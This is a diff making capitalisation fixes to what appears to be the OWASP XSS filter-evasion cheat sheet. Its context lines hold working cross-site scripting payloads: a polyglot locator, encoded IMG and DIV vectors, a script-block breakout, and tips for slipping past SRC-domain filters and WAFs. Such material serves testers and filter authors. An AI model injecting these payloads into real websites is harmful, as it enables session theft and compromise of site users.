@@ -16,7 +16,7 @@ This is a normal XSS JavaScript injection, and most likely to get caught but I s
 
 ### XSS Locator (Polygot)
 
-The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and url. Thank you to [Gareth Heyes](https://twitter.com/garethheyes) for this [contribution](https://twitter.com/garethheyes/status/997466212190781445).
+The following is a "polygot test XSS payload." This test will execute in multiple contexts including html, script string, js and URL. Thank you to [Gareth Heyes](https://twitter.com/garethheyes) for this [contribution](https://twitter.com/garethheyes/status/997466212190781445).
 
 `javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>`
 
@@ -72,7 +72,7 @@ If no quotes of any kind are allowed you can `eval()` a `fromCharCode` in JavaSc
 
 ### Default SRC Tag to Get Past Filters that Check SRC Domain
 
-This will bypass most SRC domain filters. Inserting javascript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like `onblur`, `onclick` giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .
+This will bypass most SRC domain filters. Inserting JavaScript in an event method will also apply to any HTML tag type injection that uses elements like Form, Iframe, Input, Embed etc. It will also allow any relevant event for the tag type to be substituted like `onblur`, `onclick` giving you an extensive amount of variations for many injections listed here. Submitted by David Cross .
 
 Edited by Abdullah Hussam(@Abdulahhusam).
 
@@ -102,7 +102,7 @@ All of the XSS examples that use a javascript: directive inside of an `<IMG` tag
 
 ### Decimal HTML Character References Without Trailing Semicolons
 
-This is often effective in XSS that attempts to look for "&\#XX;", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):
+This is often effective in XSS that attempts to look for "&\#XX;", since most people don't know about padding - up to 7 numeric characters total. This is also useful against people who decode against strings like $tmp\_string =\~ s/.\*\\&\#(\\d+);.\*/$1/; which incorrectly assumes a semicolon is required to terminate a HTML encoded string (I've seen this in the wild):
 
 `<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>`
 
@@ -202,7 +202,7 @@ When the application is written to output some user information inside of a Java
 
 `\";alert('XSS');//`
 
-An alternative, if correct JSON or Javascript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:
+An alternative, if correct JSON or JavaScript escaping has been applied to the embedded data but not HTML encoding, is to finish the script block and start your own:
 
 `</script><script>alert('XSS');</script>`
 
@@ -513,7 +513,7 @@ Just like above, TD's are vulnerable to BACKGROUNDs containing JavaScript XSS ve
 
 #### DIV Background-image with Unicoded XSS Exploit
 
-This has been modified slightly to obfuscate the url parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:
+This has been modified slightly to obfuscate the URL parameter. The original vulnerability was found by Renaud Lifchitz as a vulnerability in Hotmail:
 
 `<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">`
 
@@ -901,7 +901,7 @@ All the possible combinations of the character "\<" in HTML and JavaScript. Most
 
 If an attacker managed to push XSS through the filter, WAF wouldn’t be able to prevent the attack conduction.
 
-#### Reflected XSS in Javascript
+#### Reflected XSS in JavaScript
 
 ```
 Example: <script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
